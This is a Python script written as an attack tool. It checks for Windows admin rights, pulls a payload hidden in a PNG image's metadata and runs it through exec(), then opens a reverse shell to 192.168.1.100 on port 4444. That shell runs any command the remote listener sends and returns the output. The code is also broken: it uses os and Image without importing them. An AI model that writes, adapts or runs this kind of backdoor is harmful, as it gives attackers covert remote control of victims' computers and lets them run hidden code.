import socket
import subprocess
import sys
import ctypes

# Function to check if the script is running with administrative privileges
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

# Function to extract hidden payload from an image
def extract_payload(image_path):
    try:
        with Image.open(image_path) as img:
            payload = img.info.get("payload")
            if payload:
                return payload.encode()
            else:
                return None
    except Exception as e:
        print(f"Error extracting payload: {e}")
        return None

# Reverse shell functionality
def reverse_shell(server_ip, server_port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((server_ip, server_port))
        while True:
            command = s.recv(1024).decode("utf-8")
            if command.lower() == "exit":
                break
            if command.startswith("cd"):
                try:
                    os.chdir(command[3:].strip())
                    s.send(b"Changed directory successfully\n")
                except FileNotFoundError:
                    s.send(b"Directory not found\n")
                continue
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output, error = process.communicate()
            s.send(output + error)
        s.close()
    except Exception as e:
        print(f"Connection error: {e}")

if __name__ == "__main__":
    if is_admin():
        print("Running with administrative privileges.")
    else:
        print("Warning: Not running with administrative privileges.")

    # Define image path with hidden payload
    image_path = "hidden_payload.png"  # Image must contain an embedded payload
    payload = extract_payload(image_path)
    
    if payload:
        exec(payload.decode())
    
    # Start reverse shell (replace with target listener details)
    reverse_shell("192.168.1.100", 4444)